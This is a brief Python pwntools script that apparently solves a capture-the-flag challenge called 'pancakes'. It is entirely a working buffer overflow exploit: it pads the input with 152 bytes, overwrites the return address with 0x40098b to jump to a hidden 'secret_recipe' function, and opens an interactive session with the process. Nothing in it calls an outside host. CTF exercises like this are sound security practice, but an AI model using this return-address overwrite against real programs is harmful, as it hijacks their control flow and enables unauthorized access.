from pwn import *


p=process("./pancakes")

display_flag = p64(0x40098b) #<secret_recipe>:


payload = ''
payload += 'a'*152
payload += display_flag

p.recvuntil("How many pancakes do you want?")
p.sendline(payload)
p.interactive()


